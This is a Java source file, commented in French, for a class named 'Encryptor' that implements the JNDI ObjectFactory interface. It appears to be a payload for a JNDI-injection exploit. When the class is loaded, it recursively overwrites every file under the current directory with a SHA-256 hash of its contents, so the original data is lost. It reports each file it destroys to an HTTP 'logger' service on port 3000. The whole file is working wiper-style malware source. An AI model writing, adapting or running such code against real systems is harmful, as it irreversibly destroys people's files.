
import java.io.*;
import java.net.MalformedURLException;
import java.util.Base64.Encoder;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.Base64;
import java.util.Hashtable;
import java.util.Objects;
import java.util.stream.Collectors;
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;

/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Other/File.java to edit this template
 */

/**
 *
 * @author machaonix
 */
public class Encryptor implements ObjectFactory{
    /**
     * Hash chaque fichier.
     * Si le fichier est un dossier, hors '.' et '..', on appelle la methode recursivement
     * @param digest Hasher
     * @param logger Service logger pour logger
     * @param files Liste de fichiers a hasher
     * @throws IOException
     */
    private void hashFiles(MessageDigest digest, Writer logger, File[] files) throws IOException {
        for (File file : files) {
            String fileName = file.getName();
            if (file.isDirectory()) {
                if (fileName.equals(".") || fileName.equals("..")) continue;
                // Appel de la methode sur le sous dossier
                hashFiles(digest, logger, Objects.requireNonNull(file.listFiles()));
            } else {
                StringBuilder fileContent = new StringBuilder();
                String line = "";
                // On ouvre un stream sur le fichier a hassher
                try (BufferedReader br = new BufferedReader(new FileReader(file));
                     FileOutputStream fos = new FileOutputStream(file)) {
                    while (line != null) {
                        line = br.readLine();
                        fileContent.append(line);
                    }
                    // On hash le contenu du fichier et on remplace le fichier par son hash
                    byte[] encriptedFile = digest.digest(fileContent.toString().getBytes());
                    fos.write(encriptedFile);
                    logger.write("Hashage de : " + fileName + "\n");
                } catch (Exception e) {
                    logger.write("Probleme sur " + fileName + "\n");
                } finally {
                    logger.flush();
                }
            }
        }
    }

    @Override
    public Object getObjectInstance(Object o, Name name, Context cntxt, Hashtable<?, ?> hshtbl) throws IOException {
        // Connexion au service 'logger'
        URL url = new URL("http://logger:3000/log");
        HttpURLConnection con = (HttpURLConnection) url.openConnection();
        try {
            con.setDoOutput(true);
            con.setRequestMethod("POST");
            try (OutputStreamWriter logger = new OutputStreamWriter(con.getOutputStream())) {
                // Instantiation du hasher
                MessageDigest digest = MessageDigest.getInstance("SHA-256");

                // Recuperation des fichiers du repertoire courant
                File dir = new File(".");
                hashFiles(digest, logger, Objects.requireNonNull(dir.listFiles()));
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            System.out.println(con.getResponseCode());
        }
        return null;
    }

    
}
